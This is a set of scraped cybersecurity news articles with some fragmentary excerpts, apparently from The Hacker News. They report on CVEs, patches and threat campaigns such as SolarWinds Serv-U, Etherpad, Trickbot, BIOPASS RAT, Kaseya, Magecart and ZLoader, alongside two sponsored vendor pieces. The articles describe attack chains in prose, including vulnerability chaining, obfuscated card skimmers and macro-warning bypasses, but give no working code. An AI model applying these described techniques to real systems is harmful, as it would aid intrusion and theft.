spoof a target’s face and get around the login screen.\nOther critical flaws remediated by Microsoft include remote code execution vulnerabilities affecting Windows DNS Server (CVE-2021-34494, CVSS score 8.8) and Windows Kernel (CVE-2021-34458), the latter of which is rated 9.9 on the CVSS severity scale.\n“This issue allows a single root input/output virtualization (SR-IOV) device which is assigned to a guest to potentially interfere with its Peripheral Component Interface Express (PCIe) siblings which are attached to other guests or to the root,“ Microsoft noted in its advisory for CVE-2021-34458, adding Windows instances hosting virtual machines are vulnerable to this flaw.\nTo install the latest security updates, Windows users can head to Start > Settings > Update & Security > Windows Update or by selecting Check for Windows updates.\nSoftware Patches From Other Vendors\nAlongside Microsoft, patches have also been released by a number of other vendors to address several vulnerabilities, including —\nAdobeAndroidApache TomcatCiscoCitrixJuniper NetworksLinux distributions SUSE, Oracle Linux, and Red HatSAPSchneider ElectricSiemens, andVMware\n\n\nFound this article interesting?

'text': 'Microsoft on Tuesday disclosed that the latest string of attacks targeting SolarWinds Serv-U managed file transfer service with a now-patched remote code execution (RCE) exploit is the handiwork of a Chinese threat actor dubbed “DEV-0322.“\nThe revelation comes days after the Texas-based IT monitoring software maker issued fixes for the flaw that could enable adversaries to remotely run arbitrary code with privileges, allowing them to perform actions like install and run malicious payloads or view and alter sensitive data.\nTracked as CVE-2021-35211, the RCE flaw resides in Serv-U’s implementation of the Secure Shell (SSH) protocol. While it was previously revealed that the attacks were limited in scope, SolarWinds said it’s “unaware of the identity of the potentially affected customers.“\n\nAttributing the intrusions with high confidence to DEV-0322 (short for “Development Group 0322“) based on observed victimology, tactics, and procedures, Microsoft Threat Intelligence Center (MSTIC) said the adversary is known for targeting entities in the U.S. Defense Industrial Base Sector and software companies.\n\n“This activity group is based in China and has been observed using commercial VPN solutions and compromised consumer routers in their attacker infrastructure,“ according to MSTIC, which discovered the zero-day after it detected as many as six anomalous malicious processes being spawned from the main Serv-U process, suggesting a compromise.\nThe development also marks the second time a China-based hacking group has exploited vulnerabilities in SolarWinds software as a fertile field for targeted attacks against corporate networks.\n\nBack in December 2020, Microsoft disclosed that a separate espionage group may have been taking advantage of the IT infrastructure provider’s Orion software to drop a persistent backdoor called Supernova on infected systems. The intrusions have since been attributed to a China-linked threat actor called Spiral.\nAdditional indicators of compromise associated with the attack can be accessed from SolarWinds’ revised advisory here.Update: This article has been updated to reflect that attackers didn’t exploit the SolarWinds flaw to target defense and software companies.

{'title': 'Critical Flaws Reported in Etherpad — a Popular Google Docs Alternative',
'text': 'Cybersecurity researchers have disclosed new security vulnerabilities in the Etherpad text editor (version 1.8.13) that could potentially enable attackers to hijack administrator accounts, execute system commands, and even steal sensitive documents.\nThe two flaws — tracked as CVE-2021-34816 and CVE-2021-34817 — were discovered and reported on June 4 by researchers from SonarSource, following which patches have been shipped for the latter in version 1.8.14 of Etherpad released on July 4.\nEtherpad is a real-time collaborative interface that enables a document to be edited simultaneously by multiple authors. It is an open-source alternative to Google Docs that can be self-hosted or used through one of the many third-party public instances available.\n“The XSS vulnerability allows attackers to take over Etherpad users, including admins. This can be used to steal or manipulate sensitive data,“ SonarSource vulnerability researcher Paul Gerste said in a report shared with The Hacker News.\n\n“The argument injection vulnerability allows attackers to execute arbitrary code on the server, which would allow [them] to steal, modify or delete all data, or to target other internal systems that are reachable from the server.“\n\nSpecifically, the XSS vulnerability (CVE-2021-34817) resides in the chat feature offered by Etherpad, with the “userId“ property of a chat message — i.e., a unique identifier associated with a document author — rendered on the front-end without properly escaping special characters, thus permitting an adversary to insert a malicious JavaScript payload into the chat history and perform actions as a victim user.\nCVE-2021-34816, on the other hand, relates to how Etherpad manages plugins, wherein the name of the package to be installed via the “npm install“ command is not adequately sanitized, leading to a scenario that could allow an attacker to “specify a malicious package from the NPM repository or to simply use a URL that points to a package on the attacker’s server.“\n\nThe consequence of successful exploitation of CVE-2021-34816 is the execution of arbitrary code and system commands, thus completely compromising the Etherpad instance and its data.\nConcerningly, both vulnerabilities can be chained together by an attacker first to take over an administrator account and then use those privileges to gain a shell and execute malicious code on the server.\n\n“Fixed a persistent XSS vulnerability in the Chat component,“ Etherpad maintainers said in the release notes for version 1.8.14. “In case you can’t update to 1.8.14 directly, we strongly recommend to cherry-pick [commit] a796811.“ It’s worth pointing out that the argument injection vulnerability remains unpatched, although SonarSource notes that the flaw is “significantly harder to exploit on its own.“\nThe research highlights “how important data validation and sanitization is for avoiding such flaws during development,“ Gerste said, adding, “the smallest coding mistake can be the first stepping stone for an attacker to launch further attacks against the software.“\nEtherpad users are highly advised to update their installations to version 1.8.14 to mitigate the risk associated with the flaw.\n\n\nFound this article interesting?

{'title': 'Iranian Hackers Posing as Scholars Target Professors and Writers in Middle-East',
'text': 'A sophisticated social engineering attack undertaken by an Iranian-state aligned actor targeted think tanks, journalists, and professors with an aim to solicit sensitive information by masquerading as scholars with the University of London’s School of Oriental and African Studies (SOAS).\nEnterprise security firm Proofpoint attributed the campaign — called “Operation SpoofedScholars“ — to the advanced persistent threat tracked as TA453, which is also known by the aliases APT35 (FireEye), Charming Kitten (ClearSky), and Phosphorous (Microsoft). The government cyber warfare group is suspected to carry out intelligence efforts on behalf of the Islamic Revolutionary Guard Corps (IRGC).\n\n“Identified targets included experts in Middle Eastern affairs from think tanks, senior professors from well-known academic institutions, and journalists specializing in Middle Eastern coverage,“ the researchers said in a technical write-up shared with The Hacker News. “The campaign shows a new escalation and sophistication in TA453’s methods.“\n\nOn a high level, the attack chain involved the threat actor posing as British scholars to a group of highly selective victims in an attempt to entice the target into clicking on a registration link to an online conference that’s engineered to capture a variety of credentials from Google, Microsoft, Facebook, and Yahoo.\nTo lend it an air of legitimacy, the credential phishing infrastructure was hosted on a genuine but compromised website belonging to the University of London’s SOAS Radio, using which personalized credential harvesting pages disguised as registration links were then delivered to unsuspecting recipients.\nAt least in one instance, TA453 is said to have sent a credential harvesting email to a target to their personal email account. “TA453 strengthened the credibility of the attempted credential harvest by utilizing personas masquerading as legitimate affiliates of SOAS to deliver the malicious links,“ the researchers said.\n\n\nInterestingly, TA453 also insisted that the targets sign in to register for the webinar when the group was online, raising the possibility that the attackers were “planning on immediately validating the captured credentials manually.“ The attacks are believed to have commenced as far back as January January 2021, before the group subtly shifting their tactics in subsequent email phishing lures.\nThis is not the first time the threat actor has launched credential phishing attacks. Earlier this March, Proofpoint detailed a “BadBlood“ campaign targeting senior medical professionals who specialized in genetic, neurology, and oncology research in Israel and the U.S.\n“TA453 illegally obtained access to a website belonging to a world class academic institution to leverage the compromised infrastructure to harvest the credentials of their intended targets,“ the researchers said. “The use of legitimate, but compromised, infrastructure represents an increase in TA453’s sophistication and will almost certainly be reflected in future campaigns. TA453 continues to iterate, innovate, and collect in support of IRGC collection priorities.“\nUPDATE — In a statement to The Hacker News via email, a spokesperson for the University of London’s School of Oriental and African Studies (SOAS) said:\n“We understand that hackers created Gmail accounts to pretend to be academics and created a dummy site to seek to collect data from people they were targeting. This dummy page was placed on the website of SOAS Radio, which is an independent online radio station and production company based at SOAS. The website is separate from the official SOAS website and is not part of any of our academic domains. We understand the target was not SOAS itself, but external individuals.\n“To be clear, academic staff at SOAS of course have no involvement in this process, nor has any action or statement by SOAS staff led to them being spoofed in this way. There was no suggestion of breach of cybersecurity by any SOAS staff.“\n“In relation to the creation of the dummy site, no personal information was obtained from SOAS, and none of our data systems (e.g., staff and student records, financial information, emails, and core ac.uk website and so on) were involved or affected by this. Our cybersecurity systems for our core systems are robust and fit for purpose.\n“Once we became aware of the dummy site earlier this year, we immediately remedied and reported the breach in the normal way. We have reviewed how this took place and taken steps to further improve protection of these sort of peripheral systems.“\n\n\nFound this article interesting?

{'title': 'Trickbot Malware Returns with a new VNC Module to Spy on its Victims',
'text': 'Cybersecurity researchers have opened the lid on the continued resurgence of the insidious Trickbot malware, making it clear that the Russia-based transnational cybercrime group is working behind the scenes to revamp its attack infrastructure in response to recent counter efforts from law enforcement.\n“The new capabilities discovered are used to monitor and gather intelligence on victims, using a custom communication protocol to hide data transmissions between [command-and-control] servers and victims — making attacks difficult to spot,“ Bitdefender said in a technical write-up published Monday, suggesting an increase in sophistication of the group’s tactics.\n“Trickbot shows no sign of slowing down,“ the researchers noted.\n\nBotnets are formed when hundreds or thousands of hacked devices are enlisted into a network run by criminal operators, which are often then used to launch denial-of-network attacks to pummel businesses and critical infrastructure with bogus traffic with the aim of knocking them offline. But with control of these devices, malicious actors can also use botnets to spread malware and spam, or to deploy file-encrypting ransomware on the infected computers.\nTrickbot is no different. The notorious cybercrime gang behind the operation — dubbed Wizard Spider — has a track record of exploiting the infected machines to steal sensitive information, pivot laterally across a network, and even become a loader for other malware, such as ransomware, while constantly improving their infection chains by adding modules with new functionality to increase its effectiveness.\n\n“TrickBot has evolved to use a complex infrastructure that compromises third-party servers and uses them to host malware,“ Lumen’s Black Lotus Labs disclosed last October. “It also infects consumer appliances such as DSL routers, and its criminal operators constantly rotate their IP addresses and infected hosts to make disruption of their crime as difficult as possible.“\nThe botnet has since survived two takedown attempts by Microsoft and the U.S. Cyber Command, with the operators developing firmware meddling components that could allow the hackers to plant a backdoor in the Unified Extensible Firmware Interface (UEFI), enabling it to evade antivirus detection, software updates, or even a total wipe and reinstallation of the computer’s operating system.\n\nNow according to Bitdefender, the threat actor has been found actively developing an updated version of a module called “vncDll“ that it employs against select high-profile targets for monitoring and intelligence gathering. The new version has been named “tvncDll.“\nThe new module is designed to communicate with one of the nine command-and-control (C2) servers defined in its configuration file, using it to retrieve a set of attack commands, download more malware payloads, and exfiltrate gathered from the machine back to the server. Additionally, the researchers said they identified a “viewer tool,“ which the attackers use to interact with the victims through the C2 servers.\nThat’s not all. A separate report published by Cofense this week discovered fresh evidence of the botnet targeting companies in the retail, building materials, manufacturing, insurance, and construction industries with phishing emails containing invoice-themed Word documents to trigger a “fine-tuned workflow for stealing credentials.“\nWhile efforts to squash the gang’s operations may not have been entirely successful, Microsoft told The Daily Beast that it worked with internet service providers (ISPs) to go door-to-door replacing routers compromised with the Trickbot malware in Brazil and Latin America, and that it effectively pulled the plug on Trickbot infrastructure in Afghanistan.\n\n\nFound this article interesting?

The threat actor behind the exploitation remains unknown as yet, and it isn’t clear exactly how the attack was carried out.\n\n“Microsoft has provided evidence of limited, targeted customer impact, though SolarWinds does not currently have an estimate of how many customers may be directly affected by the vulnerability,“ SolarWinds said in an advisory published Friday, adding it’s “unaware of the identity of the potentially affected customers.“\nImpacting Serv-U versions 15.2.3 HF1 and before, a successful exploitation of the shortcoming (CVE-2021-35211) could enable an adversary to run arbitrary code on the infected system, including the ability to install malicious programs and view, change, or delete sensitive data.\nAs indicators of compromise, the company is urging administrators to watch out for potentially suspicious connections via SSH from the IP addresses 98[.]176.196.89 and 68[.]235.178.32, or via TCP 443 from the IP address 208[.]113.35.58. Disabling SSH access on the Serv-U installation also prevents compromise.\nThe issue has been addressed in Serv-U version 15.2.3 hotfix (HF) 2.\n\nSolarWinds also stressed in its advisory that the vulnerability is “completely unrelated to the SUNBURST supply chain attack“ and that it does not affect other products, notably the Orion Platform, which was exploited to drop malware and dig deeper into the targeted networks by suspected Russian hackers to spy on multiple federal agencies and businesses in one of the most serious security breaches in U.S. history.\nA string of software supply chain attacks since then has highlighted the fragility of modern networks and the sophistication of threat actors to identify hard-to-find vulnerabilities in widely-used software to conduct espionage and drop ransomware, in which hackers shut down the systems of business and demand payment to allow them to regain control.\n\n\nFound this article interesting?

{'title': 'Crafting a Custom Dictionary for Your Password Policy',
'text': 'Modern password policies are comprised of many different elements that contribute to its effectiveness. One of the components of an effective current password policy makes use of what is known as a custom dictionary that filters out certain words that are not allowed as passwords in the environment. \nUsing custom dictionaries, organizations can significantly improve their cybersecurity posture and filter out obvious passwords that provide poor security for user accounts.\nWhen using password dictionaries in your password policy, there are many different approaches to consider. First, let’s consider crafting a custom dictionary for your password policy, including general guidance on how these are created, configured, and how you can easily use custom dictionaries in an active directory environment.\nWhy customize your dictionary? \nCustom dictionaries are born from the need to “think as a hacker thinks.“ Compromised credentials are one of the leading causes of malicious data breaches across the board. They are also one of the most expensive to organizations. IBM’s Cost of a Data Breach Report 2020, compromised credentials increased the average total cost of a breach by nearly $1 million to $4.77 million. \nHackers often use credential-based attacks to compromise weak passwords, passwords that have been previously breached, common passwords used in a specific business sector, or common spelling transformations. Unfortunately, all of us tend to use passwords that we can easily remember. In addition, end-users often add common numbers or symbol patterns to the beginning or end of passwords to get around password complexity requirements.\nBoth human nature and the technology tools available allow easily cracking or guessing weak, standard, or expected passwords. While attackers have access to large databases of breached and otherwise common or weak passwords, the “good guys“ can implement a password file in a good way – the custom dictionary. The custom password dictionary works in favor of securing the passwords in your environment.\nWhen implemented, the custom dictionary provides a means to filter the chosen password or end-users in such a way as to disallow passwords or variations of the passwords contained in the custom dictionary. So, aren’t all passwords that meet the Active Directory Password Policy requirements secure? Not exactly. \nWhile password policy requirements defined by Active Directory Password Policy are a good starting point, they leave much to be desired when considering the cracking and other password tools that cybercriminals are using today. \nAs an example, a password policy may require that an end-user meet the following requirements:\nMinimum of 8 charactersPassword must meet complexity requirements (Must contain uppercase, lowercase, numbers, and non-alphabetic characters such as symbols)\nA password policy defined in Active Directory Domain Services\nUsing the native Active Directory Password Policy settings above, a user could potentially set passwords such as:\nP@$$w0rd123MybusinessName123!Letmein1$\nThe above passwords meet all the criteria defined as part of the length and complexity requirements. However, they are weak and easily guess due to different reasons. As the above examples show, these could be known variants of common words such as “Password,“ related to your specific business name or industry, or a common phrase contained in a cracked password database such as “Letmein1$.“\nDownloadable custom password dictionaries\nYou may not want to “reinvent the wheel“ when it comes to gathering passwords to use in a custom dictionary for your password policy. There are out-of-the-box password dictionaries and password files that can be freely downloaded as the basis for a custom password dictionary. An example includes the Have I Been Pwned password list: Have I Been Pwned: Pwned Passwords.\nCompanies can also use readily available tools such as Crunch, available in Kali Linux or installable from your Linux distribution repository. In Ubuntu, you can install Crunch using the command:\nsudo apt-get install crunch\nIt allows creating a wordlist that can be used for brute force or password strength auditing by SecOps teams in your organization. In addition, these readily available tools can provide the basis for creating your own custom password lists in your environment. \nEmploying a Password filter .dlls\nHowever, there is more involved than simply creating a password dictionary file. Organizations that want to implement their own custom password filter .dll, along with words containing their business name or industry-specific keywords, must have the development talent and resources available to create the .dll file needed for the password filter functionality in Active Directory. \nMicrosoft outlines the process of registering and installing a password filter .dll here: Installing and Registering a Password Filter DLL - Win32 apps | Microsoft Docs.\nCustom dictionary solutions in your password policy tools \nIs there an easy way to craft a custom dictionary for your password policy? Specops Password Policy takes the harder work out of implementing custom dictionaries for your password policies and allows for the negation of over 2 billion known breached passwords plus any customized terms like your company name, or location, to be added to a password policy tool. \nHigh quality password policy tools like this integrate with your native Active Directory Password Policies implemented at the Group Policy level.\nWith simple checkboxes, the Specops solution allows IT admins to easily and quickly implement multiple password dictionaries as part of the password rules configured for their organization. \nSpecops Password Policy dictionary settings\nConfiguring the Use custom dictionaries allows importing password files, hash files, or creating new dictionaries right from the interface.\nConfiguring the custom dictionaries setting in Specops Password Policy\nGet started using a custom dictionary in your password policy \nOrganizations today must bolster the security of account passwords to strengthen their overall cybersecurity posture. Using custom dictionaries as part of their password policies is a great way to factor in an offensive strategy to your cybersecurity efforts. However, implementing a custom password filter .dll in the environment requires developing the custom password filter .dll file required by Active Directory. \nThis development can present roadblocks to businesses implementing custom dictionaries like cost, maintenance, and efficiency blockers. Specops Password Policy allows implementing multiple custom dictionary files with just a few clicks, eliminating the complexity and security issues involved with implementing this correctly.\nLearn more about Specops Password Policy or start your free trial. \n \n \n\n\nFound this article interesting?

'text': 'Cybersecurity researchers are warning about a new malware that’s striking online gambling companies in China via a watering hole attack to deploy either Cobalt Strike beacons or a previously undocumented Python-based backdoor called BIOPASS RAT that takes advantage of Open Broadcaster Software (OBS) Studio’s live-streaming app to capture the screen of its victims.\nThe attack involves deceiving gaming website visitors into downloading a malware loader camouflaged as a legitimate installer for popular-but-deprecated apps such as Adobe Flash Player or Microsoft Silverlight, only for the loader to act as a conduit for fetching next-stage payloads.\nSpecifically, the websites’ online support chat pages are booby-trapped with malicious JavaScript code, which is used to deliver the malware to the victims.\n\n“BIOPASS RAT possesses basic features found in other malware, such as file system assessment, remote desktop access, file exfiltration, and shell command execution,“ Trend Micro researchers noted in an analysis published Friday. “It also has the ability to compromise the private information of its victims by stealing web browser and instant messaging client data.“\nOBS Studio is an open-source software for video recording and live streaming, enabling users to stream to Twitch, YouTube, and other platforms.\n\nBesides featuring an array of capabilities that run the typical spyware gamut, BIOPASS is equipped to establish live streaming to a cloud service under the attacker’s control via Real-Time Messaging Protocol (RTMP), in addition to communicating with the command-and-control (C2) server using the Socket.IO protocol.\nThe malware, which is said to be under active development, is also notable for its focus on stealing private data from web browsers and instant messaging apps chiefly popular in Mainland China, including QQ Browser, 2345 Explorer, Sogou Explorer, and 360 Safe Browser, WeChat, QQ, and Aliwangwang.\n\nIt isn’t clear exactly as to who is behind this malware strain, but Trend Micro researchers said they found overlaps between BIOPASS and that of TTPs often associated with the Winnti Group (aka APT41), a sophisticated Chinese hacking group specialized in cyber espionage attacks, based on the use of stolen certificates and a Cobalt Strike binary that was previously attributed to the threat actor.\n\nWhat’s more, the same Cobalt Strike binary has also been connected to a cyber attack targeting MonPass, a major certification authority (CA) in Mongolia, earlier this year wherein its installer software was tampered with to install Cobalt Strike beacon payloads on infected systems.\n“BIOPASS RAT is a sophisticated type of malware that is implemented as Python scripts,“ the researchers said. “Given that the malware loader was delivered as an executable disguised as a legitimate update installer on a compromised website, [...] it is recommended to download apps only from trusted sources and official websites to avoid being compromised.“\n\n\nFound this article interesting?

Now, almost 10 days later the firm has shipped VSA version 9.5.7a (9.5.7.2994) with fixes for three new security flaws — \nCVE-2021-30116 - Credentials leak and business logic flawCVE-2021-30119 - Cross-site scripting vulnerabilityCVE-2021-30120 - Two-factor authentication bypass\nThe security issues are part of a total of seven vulnerabilities that were discovered and reported to Kaseya by the Dutch Institute for Vulnerability Disclosure (DIVD) earlier in April, of which four other weaknesses were remediated in previous releases —\nCVE-2021-30117 - SQL injection vulnerability (Fixed in VSA 9.5.6)CVE-2021-30118 - Remote code execution vulnerability (Fixed in VSA 9.5.5)CVE-2021-30121 - Local file inclusion vulnerability (Fixed in VSA 9.5.6)CVE-2021-30201 - XML external entity vulnerability (Fixed in VSA 9.5.6)\nBesides fixes for the aforementioned shortcomings, the latest version also resolves three other flaws, including a bug that exposed weak password hashes in certain API responses to brute-force attacks as well as a separate vulnerability that could allow the unauthorized upload of files to the VSA server.\n\nFor additional security, Kaseya is recommending limiting access to the VSA Web GUI to local IP addresses by blocking port 443 inbound on the internet firewall for on-premises installations.\nKaseya is also warning its customers that installing the patch would force all users to mandatorily change their passwords post login to meet new password requirements, adding that select features have been replaced with improved alternatives and that the “release introduces some functional defects that will be corrected in a future release.“\nBesides the roll out of the patch for on-premises versions of its VSA remote monitoring and management software, the company has also instantiated the reinstatement of its VSA SaaS infrastructure. “The restoration of services is progressing according to plan, with 60% of our SaaS customers live and servers coming online for the rest of our customers in the coming hours,“ Kaseya said in a rolling advisory.\nThe latest development comes days after Kaseya cautioned that spammers are capitalizing on the ongoing ransomware crisis to send out fake email notifications that appear to be Kaseya updates, only to infect customers with Cobalt Strike payloads to gain backdoor access to the systems and deliver next-stage malware.\nKaseya has said multiple flaws were chained together in what it called a “sophisticated cyberattack“, and while it isn’t exactly clear how it was executed, it’s believed that a combination of CVE-2021-30116, CVE-2021-30119, and CVE-2021-30120 was used to carry out the intrusions. REvil, a prolific ransomware gang based in Russia, has claimed responsibility for the incident.\nThe use of trusted partners like software makers or service providers like Kaseya to identify and compromise new downstream victims, often called a supply-chain attack, and pair it with file-encrypting ransomware infections has also made it one of the largest and most significant such attacks to date.\nInterestingly, Bloomberg on Saturday reported that five former Kaseya employees had flagged the company about “glaring“ security holes in its software between 2017 and 2020, but their concerns were brushed off.\n\n“Among the most glaring problems was software underpinned by outdated code, the use of weak encryption and passwords in Kaseya’s products and servers, a failure to adhere to basic cybersecurity practices such as regularly patching software and a focus on sales at the expense of other priorities,“ the report said.\nThe Kaseya attack marks the third time that ransomware affiliates have abused Kaseya products as a vector to deploy ransomware.\nIn February 2019, the Gandcrab ransomware cartel — which later evolved into Sodinokibi and REvil — leveraged a vulnerability in a Kaseya plugin for the ConnectWise Manage software to deploy ransomware on the networks of MSPs’ customer networks. Then in June 2019, the same group went after Webroot SecureAnywhere and Kaseya VSA products to infect endpoints with Sodinokibi ransomware.\n\n\nFound this article interesting?

'text': 'Cybercrime actors part of the Magecart group have latched on to a new technique of obfuscating the malware code within comment blocks and encoding stolen credit card data into images and other files hosted on the server, once again demonstrating how the attackers are continuously improving their infection chains to escape detection.\n“One tactic that some Magecart actors employ is the dumping of swiped credit card details into image files on the server [to] avoid raising suspicion,“ Sucuri Security Analyst, Ben Martin, said in a write-up. “These can later be downloaded using a simple GET request at a later date.“\n\nMagecart is the umbrella term given to multiple groups of cybercriminals targeting e-commerce websites with the goal of plundering credit card numbers by injecting malicious JavaScript skimmers and selling them on the black market.\nSucuri attributed the attack to Magecart Group 7 based on overlaps in the tactics, techniques, and procedures (TTPs) adopted by the threat actor.\n\nIn one instance of a Magento e-commerce website infection investigated by the GoDaddy-owned security company, it was found that the skimmer was inserted in one of the PHP files involved in the checkout process in the form of a Base64-encoded compressed string.\n\nWhat’s more, to further mask the presence of malicious code in the PHP file, the adversaries are said to have used a technique called concatenation wherein the code was combined with additional comment chunks that “does not functionally do anything but it adds a layer of obfuscation making it somewhat more difficult to detect.“\nUltimately, the goal of the attacks is to capture customers’ payment card details in real-time on the compromised website, which are then saved to a bogus style sheet file (.CSS) on the server and downloaded subsequently at the threat actor’s end by making a GET request.\n“Magecart is an ever growing threat to e-commerce websites,“ Martin said. “From the perspective of the attackers: the rewards are too large and consequences non-existent, why wouldn’t they? Literal fortunes are made [by] stealing and selling stolen credit cards on the black market.“\n\n\nFound this article interesting?

{'title': 'New SaaS Security Report Dives into the Concerns and Plans of CISOs in 2021',
'text': 'For years, security professionals have recognized the need to enhance SaaS security. However, the exponential adoption of Software-as-a-Service (SaaS) applications over 2020 turned slow-burning embers into a raging fire. \nOrganizations manage anywhere from thirty-five to more than a hundred applications. From collaboration tools like Slack and Microsoft Teams to mission-critical applications like SAP and Salesforce, SaaS applications act as the foundation of the modern enterprise. 2020 created an urgent need for security solutions that mitigate SaaS misconfiguration risks.\nRecognizing the importance of SaaS security, Gartner named a new category, SaaS Security Posture Management (SSPM), to distinguish solutions that have the capabilities to offer a continuous assessment of security risks arising from a SaaS application’s deployment. \nTo understand how security teams are currently dealing with their SaaS security posture and what their main concerns are, Adaptive Shield, a leading SSPM solution, commissioned an independent survey of 300 InfoSecurity professionals from North America and Western Europe, in companies ranging from 500 to more than 10,000 employees.\nThe results of the 2021 SaaS Security Survey Report present a picture of widespread SaaS application security concerns as well as uncovers less-than-best practices organizations are turning to de facto, while trying to manage the overwhelming amount of SaaS security configurations. \nLearn more about how to gain control of your SaaS Security\nUnderstanding the SaaS Security Management Landscape\nSaaS applications provide easy-to-use, scalable solutions that offer a wide variety of native security controls. However, ultimately the configuration of all the settings, user permissions, and compliance falls on the security professionals to manage. \nSaaS Misconfiguration Worries\n85% of respondents in the 2021 SaaS Security Survey Report cited SaaS misconfigurations as one of the top three risks facing their organization. Interestingly, the other security risks that topped the list - account hijacking and data leakage - as well as many of the others on the list, can also stem directly from SaaS misconfigurations. For example, a misconfiguration in Jira led to data leakage for many Fortune 500 companies, including potential exposure for email addresses and IDs, employee roles, current projects and milestones, and more. \nFigure 1 taken from the 2021 SaaS Security Survey Report\nMore Apps Mean Less Monitoring\nAlthough this seems counterintuitive at first, upon further thought, ’more apps means less monitoring’ makes sense for the organization handling the monitoring process manually. The respondents to the survey report that as organizations continue to onboard more applications, the organization is less successful in monitoring their apps. In fact, according to the respondents, only 12% of companies using 50-99 applications engage in weekly misconfiguration checks.\nWith each app having its own design, settings, user roles, and distinct permissions, and in a dynamic environment with a steady turnover of employees, automatic software updates, and complex cross-department needs, it makes sense that organizations can lose control the more apps they onboard. \nFigure 2 taken from the 2021 SaaS Security Survey Report\nDelegating Security Impacts Risk\nWith the scope of the ever-growing portfolio of SaaS app estate, 52% of respondents report regularly putting responsibility for checking and maintaining SaaS security into the hands of the SaaS owner. The responsible parties are often in areas like Sales, Marketing, or Product. Unfortunately, these stakeholders often have little to no security background or skills. \n\nSSPM Is a 2021 Top Priority\nAn SSPM’s key capabilities enable secure cloud configuration:\nCompliance assessmentOperational monitoringRisk identificationPolicy enforcementThreat assessment\nAs CSPM and CASB tools aren’t built to address the challenges of a SaaS environment, SSPM has risen to the top of the enterprise agenda and is the top pick in terms of priorities in 2021. 48% of respondents named SSPM tools as the #1 item on their priority list. \n\nSecurity teams want full and continuous visibility into their SaaS application security posture, and SSPM solutions provide these functionalities. \nLearn how Adaptive Shield’s SSPM Solution Reduces Misconfigurations\nAutomating SaaS Security with Adaptive Shield\nAutomating maintenance of security settings and controls can enable security teams to take control of their SaaS applications. \nSaaS Security Posture Management (SSPM), like Adaptive Shield, offers a powerful platform designed uniquely to enable security teams to proactively maintain continuous security across their interconnected, divergent SaaS application estate. \nManaging SaaS app security adaptively means complete visibility and threats across the whole SaaS app estate, from video conferencing platforms and customer support tools to HR management systems, dashboards and workspaces, and much more.

{'title': 'Hackers Use New Trick to Disable Macro Security Warnings in Malicious Office Files',
'text': 'While it’s a norm for phishing campaigns that distribute weaponized Microsoft Office documents to prompt victims to enable macros in order to trigger the infection chain directly, new findings indicate attackers are using non-malicious documents to disable security warnings prior to executing macro code to infect victims’ computers.\nIn yet another instance of malware authors continue to evolve their techniques to evade detection, researchers from McAfee Labs stumbled upon a novel tactic that “downloads and executes malicious DLLs (ZLoader) without any malicious code present in the initial spammed attachment macro.“\n\nZLoader infections propagated using this mechanism have been primarily reported in the U.S., Canada, Spain, Japan, and Malaysia, the cybersecurity firm noted. The malware — a descendant of the infamous ZeuS banking trojan — is well known for aggressively using macro-enabled Office documents as an initial attack vector to steal credentials and personally identifiable information from users of targeted financial institutions.\nIn investigating the intrusions, the researchers found that the infection chain started with a phishing email containing a Microsoft Word document attachment that, when opened, downloaded a password-protected Microsoft Excel file from a remote server. However, it’s worth noting that macros need to be enabled in the Word document to trigger the download itself.\n\n“After downloading the XLS file, the Word VBA reads the cell contents from XLS and creates a new macro for the same XLS file and writes the cell contents to XLS VBA macros as functions,“ the researchers said. “Once the macros are written and ready, the Word document sets the policy in the registry to ’Disable Excel Macro Warning’ and invokes the malicious macro function from the Excel file. The Excel file now downloads the ZLoader payload. The ZLoader payload is then executed using rundll32.exe.“\n\nGiven the “significant security risk“ posed by macros, the feature is usually disabled by default, but the countermeasure has had an unfortunate side-effect of threat actors crafting convincing social engineering lures to trick victims into enabling them. By turning off the security warning presented to the user, the attacks are noteworthy because of the steps it takes to thwart detection and stay under the radar.\n“Malicious documents have been an entry point for most malware families and these attacks have been evolving their infection techniques and obfuscation, not just limiting to direct downloads of payload from VBA, but creating agents dynamically to download payloads,“ the researchers said. “Usage of such agents in the infection chain is not only limited to Word or Excel, but further threats may use other living off the land tools to download its payloads.“(The story has been updated to reflect the fact that macros need to be enabled at the start of the infection chain.)\n\n\nFound this article interesting?

{'title': 'Critical Flaws Reported in Sage X3 Enterprise Management Software',
'text': 'Four security vulnerabilities have been uncovered in the Sage X3 enterprise resource planning (ERP) product, two of which could be chained together as part of an attack sequence to enable adversaries to execute malicious commands and take control of vulnerable systems.\nThese issues were discovered by researchers from Rapid7, who notified Sage Group of their findings on Feb. 3, 2021. The vendor has since rolled out fixes in recent releases for Sage X3 Version 9 (Syracuse 9.22.7.2), Sage X3 HR & Payroll Version 9 (Syracuse 9.24.1.3), Sage X3 Version 11 (Syracuse 11.25.2.6), and Sage X3 Version 12 (Syracuse 12.10.2.8) that were shipped in March.\n\nThe list of vulnerabilities is as follows -\nCVE-2020-7388 (CVSS score: 10.0) - Sage X3 Unauthenticated Remote Command Execution (RCE) as SYSTEM in AdxDSrv.exe componentCVE-2020-7389 (CVSS score“ 5.5) - System “CHAINE“ Variable Script Command Injection (No fix planned)CVE-2020-7387 (CVSS score: 5.3) - Sage X3 Installation Pathname DisclosureCVE-2020-7390 (CVSS score: 4.6) - Stored XSS Vulnerability on ’Edit’ Page of User Profile\n“When combining CVE-2020-7387 and CVE-2020-7388, an attacker can first learn the installation path of the affected software, then use that information to pass commands to the host system to be run in the SYSTEM context,“ the researchers said. “This can allow an attacker to run arbitrary operating system commands to create Administrator level users, install malicious software, and otherwise take complete control of the system for any purpose.“\n\nThe most severe of the issues is CVE-2020-7388, which takes advantage of an administrative service that’s accessible over the internet to craft malicious requests with the goal of running arbitrary commands on the server as the “NT AUTHORITY/SYSTEM“ user. The service in question is used for remote management of the Sage ERP solution through the Sage X3 Console.\n\nSeparately, the ’Edit’ page associated with user profiles in the Sage X3 Syracuse web server component is vulnerable to a stored XSS attack (CVE-2020-7390), enabling the execution of arbitrary JavaScript code during ’mouseOver’ events in the ’First name’, ’Last name’, and ’Email’ fields.\n“If successful, however, this vulnerability could allow a regular user of Sage X3 to execute privileged functions as a currently logged-in administrator or capture administrator session cookies for later impersonation as a currently-logged-in administrator,“ the researchers said.\nSuccessful exploitation of CVE-2020-7387, on the other hand, results in the exposure of Sage X3 installation paths to an unauthorized user, while CVE-2020-7389 concerns a missing authentication in Syracuse development environments that could be used to gain code execution via command injection.\n“Generally speaking, Sage X3 installations should not be exposed directly to the internet, and should instead be made available via a secure VPN connection where required,“ the researchers noted in the disclosure. “Following this operational advice effectively mitigates all four vulnerabilities, though customers are still urged to update according to their usual patch cycle schedules.“\n\n\nFound this article interesting?

